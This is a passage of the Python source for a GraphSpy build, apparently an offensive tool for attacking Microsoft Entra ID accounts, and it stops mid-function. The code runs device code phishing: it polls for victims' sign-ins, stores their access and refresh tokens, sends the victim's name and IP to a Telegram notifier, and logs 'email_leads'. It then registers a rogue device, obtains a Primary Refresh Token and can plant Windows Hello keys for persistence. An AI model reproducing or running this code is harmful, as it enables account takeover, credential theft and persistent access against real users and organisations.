# graphspy/cli.py

# Built-in imports
import os
import sys
import shutil
import traceback
import logging
import inspect
import sqlite3
import time
import json
import base64
import uuid
import urllib.parse
import binascii
import re
from datetime import datetime, timezone
from threading import Thread

# External library imports
from flask import Flask, render_template, request, g, redirect, Response, jsonify
import flask.helpers
import requests
import jwt
import pyotp

# Local library imports
from . import __version__

# ========== Database ==========

def init_db():
    con = sqlite3.connect(app.config['graph_spy_db_path'])
    con.execute('CREATE TABLE accesstokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, issued_at TEXT, expires_at TEXT, description TEXT, user TEXT, resource TEXT, accesstoken TEXT)')
    con.execute('CREATE TABLE refreshtokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, description TEXT, user TEXT, tenant_id TEXT, client_id TEXT, resource TEXT, foci INTEGER, refreshtoken TEXT)')
    con.execute('CREATE TABLE devicecodes (id INTEGER PRIMARY KEY AUTOINCREMENT, generated_at INTEGER, expires_at INTEGER, user_code TEXT, device_code TEXT, interval INTEGER, client_id TEXT, status TEXT' + 
                ', last_poll INTEGER, auto_action TEXT, auto_device_name TEXT, auto_join_type INTEGER, auto_device_type TEXT, auto_os_version TEXT, auto_target_domain TEXT)')
    con.execute('CREATE TABLE request_templates (id INTEGER PRIMARY KEY AUTOINCREMENT, template_name TEXT, uri TEXT, method TEXT, request_type TEXT, body TEXT, headers TEXT, variables TEXT)')
    con.execute('CREATE TABLE teams_settings (access_token_id INTEGER PRIMARY KEY, skypeToken TEXT, skype_id TEXT, issued_at INTEGER, expires_at INTEGER, teams_settings_raw TEXT)')
    con.execute('CREATE TABLE mfa_otp (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, secret_key TEXT, account_name INTEGER, description TEXT)')
    con.execute('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, device_id TEXT, device_name TEXT, device_type TEXT, join_type TEXT, priv_key TEXT, certificate TEXT)')
    con.execute('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, user TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER, description TEXT)')
    con.execute('CREATE TABLE winhello_keys (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, key_id TEXT, device_id TEXT, user TEXT, priv_key TEXT)')
    con.execute('CREATE TABLE settings (setting TEXT UNIQUE, value TEXT)')
    # Valid Settings: active_access_token_id, active_refresh_token_id, active_prt_id, schema_version, user_agent
    cur = con.cursor()
    cur.execute("INSERT INTO settings (setting, value) VALUES ('schema_version', '6')")
    con.commit()
    con.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(app.config['graph_spy_db_path'])
    return db

def query_db(query, args=(), one=False):
    con = get_db()
    con.row_factory = sqlite3.Row
    cur = con.execute(query, args)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv
    
def query_db_json(query, args=(), one=False):
    con = get_db()
    con.row_factory = make_dicts
    cur = con.execute(query, args)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv
    
def execute_db(statement, args=()):
    con = get_db()
    cur = con.cursor()
    cur.execute(statement, args)
    con.commit()
    return cur.lastrowid
    
def make_dicts(cursor, row):
    return dict((cursor.description[idx][0], value)
                for idx, value in enumerate(row))
    
def list_databases():
    db_folder_content = os.scandir(app.config['graph_spy_db_folder'])
    databases = [
        {
            'name': db_file.name, 
            'last_modified': f"{datetime.fromtimestamp(db_file.stat().st_mtime)}".split(".")[0], 
            'size': f"{round(db_file.stat().st_size/1024)} KB",
            'state': "Active" if db_file.name.lower() == os.path.basename(app.config['graph_spy_db_path']).lower() else "Inactive"
        } for db_file in db_folder_content if db_file.is_file() and db_file.name.endswith(".db")]
    return databases

def update_db():
    latest_schema_version = "7"
    current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
    if current_schema_version == "1":
        print("[*] Current database is schema version 1, updating to schema version 2")
        execute_db("CREATE TABLE request_templates (id INTEGER PRIMARY KEY AUTOINCREMENT, template_name TEXT, uri TEXT, method TEXT, request_type TEXT, body TEXT, headers TEXT, variables TEXT)")
        execute_db("UPDATE settings SET value = '2' WHERE setting = 'schema_version'")
        print("[*] Updated database to schema version 2")
        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
    if current_schema_version == "2":
        print("[*] Current database is schema version 2, updating to schema version 3")
        execute_db('CREATE TABLE teams_settings (access_token_id INTEGER PRIMARY KEY, skypeToken TEXT, skype_id TEXT, issued_at INTEGER, expires_at INTEGER, teams_settings_raw TEXT)')
        execute_db("UPDATE settings SET value = '3' WHERE setting = 'schema_version'")
        print("[*] Updated database to schema version 3")
        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
    if current_schema_version == "3":
        print("[*] Current database is schema version 3, updating to schema version 4")
        execute_db('CREATE TABLE mfa_otp (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, secret_key TEXT, account_name INTEGER, description TEXT)')
        execute_db("UPDATE settings SET value = '4' WHERE setting = 'schema_version'")
        print("[*] Updated database to schema version 4")
        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
    if current_schema_version == "4":
        print("[*] Current database is schema version 4, updating to schema version 5")
        execute_db('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, device_id TEXT, device_name TEXT, device_type TEXT, join_type TEXT, priv_key TEXT, certificate TEXT)')
        execute_db('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, user TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER, description TEXT)')
        execute_db('CREATE TABLE winhello_keys (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, key_id TEXT, device_id TEXT, user TEXT, priv_key TEXT)')
        execute_db("ALTER TABLE refreshtokens ADD COLUMN client_id TEXT")
        execute_db("UPDATE settings SET value = '5' WHERE setting = 'schema_version'")
        print("[*] Updated database to schema version 5")
        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
    if current_schema_version == "5":
        print("[*] Current database is schema version 5, updating to schema version 6")
        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_action TEXT")
        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_device_name TEXT")
        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_join_type INTEGER")
        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_device_type TEXT")
        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_os_version TEXT")
        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_target_domain TEXT")
        execute_db("UPDATE settings SET value = '6' WHERE setting = 'schema_version'")
        print("[*] Updated database to schema version 6")
        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
    if current_schema_version == "6":
        print("[*] Current database is schema version 6, updating to schema version 7")
        execute_db('CREATE TABLE IF NOT EXISTS cached_admins (id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT UNIQUE, admins_json TEXT, fetched_at TEXT)')
        execute_db('CREATE TABLE IF NOT EXISTS email_leads (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, lead_email TEXT, lead_name TEXT, source TEXT, first_seen TEXT, UNIQUE(user_email, lead_email))')
        execute_db("UPDATE settings SET value = '7' WHERE setting = 'schema_version'")
        print("[*] Updated database to schema version 7")
        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]


# ========== Helper Functions ==========

class AppError(Exception):
    def __init__(self, message, status_code=400):
        super().__init__(message)
        self.message = message
        self.status_code = status_code
        frame = inspect.stack()[1]
        self.func_name = frame.function
        self.line_number = frame.lineno

def create_response(status_code, message = None, data = None):
    response_body = {}
    if message != None:
        response_body["message"] = message
    if data != None:
        response_body["data"] = data
    return jsonify(response_body), status_code

def parse_token_endpoint_error(error_response):
    try:
        error_code = error_response.json().get('error', 'Unknown error')
        error_description = error_response.json().get('error_description', 'Unknown error')
        error_msg = f"[{error_response.status_code}] {error_code}: {error_description}"
    except ValueError:
        error_msg = f"[{error_response.status_code}] {error_response.text}"
    return error_msg

def get_user_agent():
    user_agent = query_db("SELECT value FROM settings where setting = 'user_agent'",one=True)
    if user_agent:
        return user_agent[0]
    else:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"

def set_user_agent(user_agent):
    execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('user_agent',?)",(user_agent,))
    if get_user_agent() == user_agent:
        return True
    else:
        return False

def graph_request(graph_uri, access_token_id, method = "GET", body = {}):
    access_token = query_db("SELECT accesstoken FROM accesstokens where id = ?",[access_token_id],one=True)[0]
    headers = {"Authorization":f"Bearer {access_token}", "User-Agent":get_user_agent()}
    if method == "GET":
        response = requests.get(graph_uri, headers=headers)
    elif method == "POST":
        response = requests.post(graph_uri, headers=headers, json=body)
    elif method == "DELETE":
        response = requests.delete(graph_uri, headers=headers, json=body)
    elif method == "PATCH":
        response = requests.patch(graph_uri, headers=headers, json=body)
    elif method == "PUT":
        response = requests.put(graph_uri, headers=headers, json=body)
    try:
        resp_json = response.json()
        return json.dumps(resp_json)
    except ValueError:
        return response.text if response.text else ""

def graph_upload_request(upload_uri, access_token_id, file):
    access_token_entry = query_db("SELECT accesstoken FROM accesstokens WHERE id = ?", [access_token_id], one=True)
    if not access_token_entry:
        return json.dumps({"error": "Invalid access token ID"}), 400

    access_token = access_token_entry[0]
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": file.content_type, "User-Agent":get_user_agent()}

    response = requests.put(upload_uri, headers=headers, data=file.read())

    if response.status_code in [200, 201, 202]:
        return json.dumps({"message": "File uploaded successfully."}), response.status_code
    else:
        return json.dumps({"error": "Failed to upload file.", "details": response.text}), response.status_code
    
def generic_request(uri, access_token_id, method, request_type, body, headers={}, cookies={}):
    access_token = query_db("SELECT accesstoken FROM accesstokens where id = ?",[access_token_id],one=True)[0]
    headers["Authorization"] = f"Bearer {access_token}"
    headers["User-Agent"] = get_user_agent()

    retry_count = 3
    while retry_count > 0:
        # Empty body
        if not body:
            response = requests.request(method, uri, headers=headers)
        # Text, XML or urlencoded request
        elif request_type in ["text", "urlencoded", "xml"]:
            if request_type == "urlencoded" and not "Content-Type" in headers:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            if request_type == "xml" and not "Content-Type" in headers:
                headers["Content-Type"] = "application/xml"
            response = requests.request(method, uri, headers=headers, data=body)
        # Json request
        elif request_type == "json":
            try:
                if type(body) == str:
                    body = json.loads(body)
                response = requests.request(method, uri, headers=headers, json=body)
            except ValueError as e:
                return f"[Error] The body message does not contain valid JSON, but a body type of JSON was specified.", 400
        else:
            return f"[Error] Invalid request type.", 400

        if response.status_code == 429 and "Retry-After" in response.headers:
            # Request throttled
            retry_count -= 1
            retry_delay = int(response.headers["Retry-After"]) + 1 
            gspy_log.debug(f"Request throttled. Received status code 429. Retrying after {retry_delay} seconds [{retry_count} attempts left]")
            time.sleep(retry_delay)
        else:
            break

    # Format json if the Content-Type contains json
    response_type = "json" if ("Content-Type" in response.headers and "json" in response.headers["Content-Type"]) else "xml" if ("Content-Type" in response.headers and "xml" in response.headers["Content-Type"]) else "text"
    try:
        response_text = json.dumps(response.json()) if response_type == "json" else response.text
    except ValueError as e:
        response_text = response.text
    return {"response_status_code": response.status_code ,"response_type": response_type ,"response_text": response_text, "response_headers": dict(response.headers)}

def save_access_token(accesstoken, description):
    decoded_accesstoken = jwt.decode(accesstoken, options={"verify_signature": False})
    user = "unknown"
    # If the idtype is user, use the unique_name or upn
    # If the idtype is app, use the app_displayname or appid
    # Otherwise, use whatever we can get
    if "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "user":
        user = decoded_accesstoken["unique_name"] if "unique_name" in decoded_accesstoken else decoded_accesstoken["upn"] if "upn" in decoded_accesstoken else "unknown"
    elif "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "app":
        user = decoded_accesstoken["app_displayname"] if "app_displayname" in decoded_accesstoken else decoded_accesstoken["appid"] if "appid" in decoded_accesstoken else "unknown"
    else:
        user = decoded_accesstoken["unique_name"] if "unique_name" in decoded_accesstoken \
            else decoded_accesstoken["upn"] if "upn" in decoded_accesstoken \
            else decoded_accesstoken["app_displayname"] if "app_displayname" in decoded_accesstoken \
            else decoded_accesstoken["oid"] if "oid" in decoded_accesstoken \
            else "unknown"
    
    row_id = execute_db("INSERT INTO accesstokens (stored_at, issued_at, expires_at, description, user, resource, accesstoken) VALUES (?,?,?,?,?,?,?)",(
            f"{datetime.now()}".split(".")[0],
            datetime.fromtimestamp(decoded_accesstoken["iat"]) if "iat" in decoded_accesstoken else "unknown",
            datetime.fromtimestamp(decoded_accesstoken["exp"]) if "exp" in decoded_accesstoken else "unknown",
            description,
            user,
            decoded_accesstoken["aud"] if "aud" in decoded_accesstoken else "unknown",
            accesstoken
            )
    )
    return row_id
    
def save_refresh_token(refreshtoken, description, user, tenant, resource, foci, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"):
    # Used to convert potential boolean inputs to an integer, as the DB uses an integer to store this value
    foci_int = 1 if foci else 0
    if tenant == "common":
        tenant_id = "common"
    else:
        tenant_id = tenant.strip('"{}-[]\\/\' ') if is_valid_uuid(tenant.strip('"{}-[]\\/\' ')) else get_tenant_id(tenant)
    row_id =execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?,?)",(
            f"{datetime.now()}".split(".")[0],
            description,
            user,
            tenant_id,
            client_id,
            resource,
            foci_int,
            refreshtoken
            )
    )
    return row_id

def is_valid_uuid(val):
    try:
        uuid.UUID(str(val))
        return True
    except ValueError:
        return False

def get_tenant_id(tenant_domain):
    headers = {"User-Agent":get_user_agent()}
    response = requests.get(f"https://login.microsoftonline.com/{tenant_domain}/.well-known/openid-configuration", headers=headers)
    resp_json = response.json()
    tenant_id = resp_json["authorization_endpoint"].split("/")[3]
    return tenant_id

def refresh_to_access_token(refresh_token_id, client_id = "defined_in_token", resource = "defined_in_token", scope = "", store_refresh_token = True, api_version = 1):
    refresh_token = query_db("SELECT refreshtoken FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0]
    tenant_id = query_db("SELECT tenant_id FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0] or "common"
    resource = query_db("SELECT resource FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0] if resource == "defined_in_token" else resource
    client_id = query_db("SELECT client_id FROM refreshtokens where id = ?",[refresh_token_id],one=True)[0] if client_id == "defined_in_token" else client_id
    body =  {
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token
    }
    url = f"https://login.microsoftonline.com/{tenant_id}"
    if api_version == 1:
        body["resource"] = resource
        url += "/oauth2/token?api-version=1.0"
    if api_version == 2:
        body["scope"] = scope
        url += "/oauth2/v2.0/token"

    headers = {"User-Agent":get_user_agent()}
    response = requests.post(url, data=body, headers=headers)
    if response.status_code != 200:
        return {parse_token_endpoint_error(response)}
    access_token = response.json()["access_token"]
    save_access_token(access_token, f"Created using refresh token {refresh_token_id}")
    access_token_id = query_db("SELECT id FROM accesstokens where accesstoken = ?",[access_token],one=True)[0]
    if store_refresh_token:
        decoded_accesstoken = jwt.decode(access_token, options={"verify_signature": False})
        user = "unknown"
        # If the idtype is user, use the unique_name or upn
        # If the idtype is app, use the app_displayname or appid
        if "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "user":
            user = decoded_accesstoken["unique_name"] if "unique_name" in decoded_accesstoken else decoded_accesstoken["upn"] if "upn" in decoded_accesstoken else "unknown"
        elif "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "app":
            user = decoded_accesstoken["app_displayname"] if "app_displayname" in decoded_accesstoken else decoded_accesstoken["appid"] if "appid" in decoded_accesstoken else "unknown"
        save_refresh_token(
            response.json()["refresh_token"],
            f"Created using refresh token {refresh_token_id}",
            user,
            tenant_id,
            response.json()["resource"]  if "resource" in response.json() else "unknown",
            response.json()["foci"] if "foci" in response.json() else 0,
            client_id
        )
    return access_token_id

# ========== Device Code Functions ==========

def generate_device_code(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", scope = "https://graph.microsoft.com/.default openid offline_access", ngcmfa = False, cae = False,
                         auto_action = None, auto_device_name = None, auto_join_type = None, auto_device_type = None, auto_os_version = None, auto_target_domain = None):
    if version == 1:
        body =  {
            "client_id": client_id,
            "resource": resource
        }
        if (ngcmfa):
            body["amr_values"]= "ngcmfa"
        url = "https://login.microsoftonline.com/common/oauth2/devicecode"
    elif version == 2:
        body =  {
            "client_id": client_id,
            "scope": scope
        }
        if (ngcmfa or cae):
            claims_json = {"access_token":{}}
            if ngcmfa:
                claims_json["access_token"]["amr"]= {"values":["ngcmfa"]}
            if cae:
                claims_json["access_token"]["xms_cc"]= {"values":["cp1"]}
            body["claims"]= json.dumps(claims_json)
        url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    else:
        raise AppError(f"Unsupported token endpoint version: '{version}'")
    headers = {"User-Agent":get_user_agent()}
    response = requests.post(url, data=body,headers=headers)
    if response.status_code != 200:
        raise AppError(f"Failed to generate device code.\n{parse_token_endpoint_error(response)}")
    execute_db("INSERT INTO devicecodes (generated_at, expires_at, user_code, device_code, interval, client_id, status, last_poll, auto_action, auto_device_name, auto_join_type, auto_device_type, auto_os_version, auto_target_domain) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",(
            int(datetime.now().timestamp()),
            int(datetime.now().timestamp()) + int(response.json()["expires_in"]),
            response.json()["user_code"],
            response.json()["device_code"],
            int(response.json()["interval"]),
            client_id,
            "CREATED",
            0,
            auto_action,
            auto_device_name,
            auto_join_type,
            auto_device_type,
            auto_os_version,
            auto_target_domain
        )
    )
    return response.json()["device_code"]

def poll_device_codes():
    with app.app_context():
        while True:
            rows = query_db_json("SELECT * FROM devicecodes WHERE status IN ('CREATED','POLLING')")
            if not rows:
                return
            sorted_rows =  sorted(rows, key=lambda x: x["last_poll"])
            for row in sorted_rows:
                current_time_seconds = int(datetime.now().timestamp())
                if current_time_seconds > row["expires_at"]:
                    execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("EXPIRED",row["device_code"]))
                    continue
                next_poll = row["last_poll"] + row["interval"]
                #print(f"[{current_time_seconds}] {row['user_code']} - {row['last_poll']} - {next_poll}", flush=True)
                if current_time_seconds < next_poll:
                    time.sleep(next_poll - current_time_seconds)
                if row["status"] == "CREATED":
                    execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("POLLING",row["device_code"]))
                body = {
                    "client_id": row["client_id"],
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "code": row["device_code"]
                }
                url = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
                headers = {"User-Agent":get_user_agent()}
                response = requests.post(url, data=body, headers=headers)
                execute_db("UPDATE devicecodes SET last_poll = ? WHERE device_code = ?",(int(datetime.now().timestamp()),row["device_code"]))
                if response.status_code == 200 and "access_token" in response.json():
                    access_token = response.json()["access_token"]
                    user_code = row["user_code"]
                    access_token_id = save_access_token(access_token, f"Created using device code auth ({user_code})")
                    decoded_accesstoken = jwt.decode(access_token, options={"verify_signature": False})
                    user = "unknown"
                    # If the idtype is user, use the unique_name or upn
                    # If the idtype is app, use the app_displayname or appid
                    if "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "user":
                        user = decoded_accesstoken["unique_name"] if "unique_name" in decoded_accesstoken else decoded_accesstoken["upn"] if "upn" in decoded_accesstoken else "unknown"
                    elif "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "app":
                        user = decoded_accesstoken["app_displayname"] if "app_displayname" in decoded_accesstoken else decoded_accesstoken["appid"] if "appid" in decoded_accesstoken else "unknown"
                    else:
                        user = "unknown"
                    # Send Telegram notification
                    try:
                        ip_addr = decoded_accesstoken.get("ipaddr", "unknown")
                        send_telegram_notification(user, ip_addr)
                    except:
                        pass
                    refresh_token_id = save_refresh_token(
                        response.json()["refresh_token"], 
                        f"Created using device code auth ({user_code})", 
                        user, 
                        decoded_accesstoken["tid"] if "tid" in decoded_accesstoken else "unknown", 
                        response.json()["resource"]if "resource" in response.json() else "unknown", 
                        int(response.json()["foci"]) if "foci" in response.json() else 0,
                        row["client_id"]
                    )
                    if row.get("auto_action") in ["device_prt", "winhello"]:
                        execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("ACTION_IN_PROGRESS",row["device_code"]))
                        try:
                            gspy_log.debug(f"Device code phishing successful for code '{user_code}', performing auto action '{row.get('auto_action')}'")
                            device_id = register_device(access_token_id, row.get("auto_device_name"), row.get("auto_join_type"), row.get("auto_device_type"), row.get("auto_os_version"), row.get("auto_target_domain"))
                            prt_id = request_prt_for_device(device_id, refresh_token_id, row.get("auto_os_version"))
                            if row.get("auto_action") == "winhello":
                                device_reg_access_token_id = refresh_prt_to_access_token(prt_id, "dd762716-544d-4aeb-a526-687b73838a22", "urn:ms-drs:enterpriseregistration.windows.net")
                                register_winhello(device_reg_access_token_id)
                        except Exception as e:
                            gspy_log.error(f"Device code phishing successful for code '{user_code}', but the auto action '{row.get('auto_action')}' failed.\n{e}")
                            execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("PARTIAL_SUCCESS",row["device_code"]))
                            continue
                    execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("SUCCESS",row["device_code"]))

def start_device_code_thread():
    if "device_code_thread" in app.config:
        if app.config["device_code_thread"].is_alive():
            return "[Error] Device Code polling thread is still running."
    app.config["device_code_thread"] =  Thread(target=poll_device_codes)
    app.config["device_code_thread"].start()
    return "[Success] Started device code polling thread."

def device_code_flow(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", scope = "https://graph.microsoft.com/.default openid offline_access", ngcmfa = False, cae = False,
                     auto_action = None, auto_device_name = None, auto_join_type = None, auto_device_type = None, auto_os_version = None, auto_target_domain = None):
    device_code = generate_device_code(version, client_id, resource, scope, ngcmfa,cae, auto_action, auto_device_name, auto_join_type, auto_device_type, auto_os_version, auto_target_domain)
    row = query_db_json("SELECT * FROM devicecodes WHERE device_code = ?",[device_code],one=True)
    user_code = row["user_code"]
    start_device_code_thread()
    return user_code

# ========== PRT Functions ==========

def generate_key_pair():
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
    private_key_bytes = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    public_key = private_key.public_key()
    return private_key, private_key_bytes, public_key

def generate_public_key_rsa_blob(public_key):
    import struct
    pubnumbers = public_key.public_numbers()
    exponent_as_bytes = pubnumbers.e.to_bytes((pubnumbers.e.bit_length() + 7) // 8, byteorder='big')
    modulus_as_bytes = pubnumbers.n.to_bytes((pubnumbers.n.bit_length() + 7) // 8, byteorder='big')
    header = [
        b'RSA1',
        struct.pack('<L', public_key.key_size),
        struct.pack('<L', len(exponent_as_bytes)),
        struct.pack('<L', len(modulus_as_bytes)),
        # No private key so these are zero
        struct.pack('<L', 0),
        struct.pack('<L', 0),
    ]
    pubkeycngblob = base64.b64encode(b''.join(header)+exponent_as_bytes+modulus_as_bytes)
    return pubkeycngblob

def register_device(access_token_id, device_name = "GraphSpy-Device", join_type = 0, device_type = "Windows", os_version = "10.0.26100", target_domain = "e-corp.local"):
    """
    All credit to:
    https://github.com/dirkjanm/ROADtools
    https://github.com/kiwids0220/deviceCode2WinHello
    """	
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    # Generate a private key
    private_key, private_key_bytes, public_key = generate_key_pair()
    private_key_base64 = base64.b64encode(private_key_bytes).decode('utf-8')
    pubkeycngblob = generate_public_key_rsa_blob(public_key)
    # Generate Certificate Signing Request
    csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "7E980AD9-B86D-4306-9425-9AC066FB014A"),
        ])).sign(private_key, hashes.SHA256())
    certreq = csr.public_bytes(serialization.Encoding.DER)
    certbytes = base64.b64encode(certreq)

    request_body = {
        "CertificateRequest":
            {
                "Type": "pkcs10",
                "Data": certbytes.decode('utf-8')
            },
        "TransportKey": pubkeycngblob.decode('utf-8'),
        "TargetDomain": target_domain,
        "DeviceType": device_type,
        "OSVersion": os_version,
        "DeviceDisplayName": device_name,
        "JoinType": join_type,
        "attributes": {
            "ReuseDevice": "true",
            "ReturnClientSid": "true"
        }
    }
    # Registering device
    access_token = query_db("SELECT accesstoken FROM accesstokens where id = ?",[access_token_id],one=True)[0]
    if not access_token:
        raise AppError(f"No access token with ID {access_token_id}!")
    headers = {"User-Agent": get_user_agent(), "Authorization": f"Bearer {access_token}"}
    response = requests.post("https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0", headers=headers, json=request_body)
    if response.status_code != 200:
        try:
            error_code = response.json().get('code', 'Unknown error')
            error_description = response.json().get('message', 'Unknown error')
            error_msg = f"[{response.status_code}] {error_code}: {error_description}"
            raise AppError(f"Failed to register device.\n{error_msg}")
        except ValueError as e:
            error_msg = f"Failed to register device.\n{response.text}"
        raise AppError(f"Failed to register device.\n{error_msg}")
    response_json = response.json()
    gspy_log.debug(f"Device registration response:\n{response_json}")
    if not "Certificate" in response_json:
        raise AppError(f"Failed to register device. No certificate in response.")
    # Store certificate and private key
    certificate_base64 = response_json['Certificate']['RawBody']
    certificate = x509.load_der_x509_certificate(base64.b64decode(certificate_base64))
    device_id = certificate.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
    execute_db("INSERT INTO device_certificates (stored_at, device_id, device_name, device_type, join_type, priv_key, certificate) VALUES (?, ?, ?, ?, ?, ?, ?)", (
        int(datetime.now().timestamp()), 
        device_id, 
        device_name, 
        device_type, 
        "joined" if join_type == 0 else "registered" if join_type == 4 else "unknown", 
        private_key_base64, 
        certificate_base64
    ))
    return device_id

def get_srv_challenge_nonce():
    nonce_response = requests.post('https://login.microsoftonline.com/common/oauth2/token', data={'grant_type':'srv_challenge'})
    if nonce_response.status_code != 200:
        raise AppError(f"Failed to obtain nonce.\n{parse_token_endpoint_error(nonce_response)}")
    nonce_response_json = nonce_response.json()
    if not "Nonce" in nonce_response_json:
        raise AppError(f"Failed to obtain nonce. No 'Nonce' in response.")
    return nonce_response_json["Nonce"]

def decrypt_session_key(session_key_jwe, private_key):
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding as apadding
    jwe_payload_base64 = session_key_jwe.split(".")[1]
    jwe_payload_base64_padded = jwe_payload_base64 + ('='*(len(jwe_payload_base64)%4))
    jwe_payload_bytes = base64.urlsafe_b64decode(jwe_payload_base64_padded)
    session_key_bytes = private_key.decrypt(jwe_payload_bytes, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))
    session_key_hex = binascii.hexlify(session_key_bytes).decode('utf-8')
    return session_key_hex

def request_prt_for_device(device_id, refresh_token_id, os_version = "10.0.26100"):
    """
    All credit to:
    https://github.com/dirkjanm/ROADtools
    https://github.com/kiwids0220/deviceCode2WinHello
    """	
    from cryptography.hazmat.primitives import serialization
    nonce = get_srv_challenge_nonce()
    refresh_token = query_db("SELECT refreshtoken FROM refreshtokens WHERE id = ?",[refresh_token_id],one=True)[0]
    refresh_token_user = query_db("SELECT user FROM refreshtokens WHERE id = ?",[refresh_token_id],one=True)[0]
    if not refresh_token:
        raise AppError(f"No refresh token with ID {refresh_token_id}!")
    
    certificate_base64 = query_db("SELECT certificate FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
    private_key_base64 = query_db("SELECT priv_key FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
    if not certificate_base64 or not private_key_base64:
        raise AppError(f"No certificate or private key for device with ID {device_id}!")
    private_key_bytes = base64.b64decode(private_key_base64)
    private_key = serialization.load_pem_private_key(private_key_bytes, password=None)
    # Generate and sign JWT
    jwt_payload = {
        "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
        "request_nonce": nonce,
        "scope": "openid aza ugs",
        "group_sids": [],
        "win_ver": os_version,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
    }
    jwt_header = {
        "x5c": certificate_base64,
        "kdf_ver": 2
    }
    request_jwt = jwt.encode(jwt_payload, key=private_key, algorithm='RS256', headers=jwt_header)
    # Request PRT
    prt_request_data = {
        'windows_api_version':'2.2',
        'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer',
        'request':request_jwt,
        'tgt': False # No need to request a TGT right now with the current functionality, maybe support it later
    }
    headers = {"User-Agent":get_user_agent()}
    response = requests.post("https://login.microsoftonline.com/common/oauth2/token", data=prt_request_data, headers=headers)
    if response.status_code != 200:
        raise AppError(parse_token_endpoint_error(response))
    response_json = response.json()
    gspy_log.debug(f"PRT request response:\n{response_json}")
    if not "refresh_token" in response_json or not "session_key_jwe" in response_json:
        raise AppError(f"Failed to request PRT. No 'refresh_token' or 'session_key_jwe' in response.")
    prt = response_json["refresh_token"]
